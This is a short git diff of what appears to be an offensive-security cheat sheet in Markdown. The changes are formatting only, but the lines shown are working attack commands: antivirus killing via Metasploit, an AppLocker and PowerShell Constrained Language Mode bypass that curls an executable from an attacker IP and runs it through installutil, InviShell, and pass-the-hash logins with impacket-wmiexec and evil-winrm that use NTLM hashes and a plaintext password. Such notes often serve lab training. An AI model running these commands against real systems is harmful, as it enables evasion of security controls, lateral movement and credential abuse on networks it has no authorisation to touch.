@@ -54,12 +54,12 @@ run post/windows/manage/killav
 
 
 #### AppLocker PowerShell Bypass 
-Check for Constrained Language Mode 
 ```
+#Check for Constrained Language Mode
 $ExecutionCOntext.SessionState.LanguageMode
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 
-```
-```
+
+#CLM bypass
 curl http://192.168.45.201/PSbypassCLM2.exe -o bypass.exe
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
 C:\AD\Tools\InviShell\InviShell\RunWithRegistryNonAdmin.bat
@@ -316,7 +316,7 @@ sudo impacket-wmiexec administrator@172.16.1.1 -hashes ':71d04f9d50ceb1f64de7a09
 sudo evil-winrm -i 10.10.15.20 -u joe -p password
 sudo evil-winrm -i 10.10.15.20 -u melissa -H 251e366fdd64eff18be0824ec7c6833c
 sudo proxychains4 evil-winrm -i 192.168.154.169 -u 'OPS.COMPLY.COM\pete' -p '0998ASDaas2'
-
+```
 
 
 
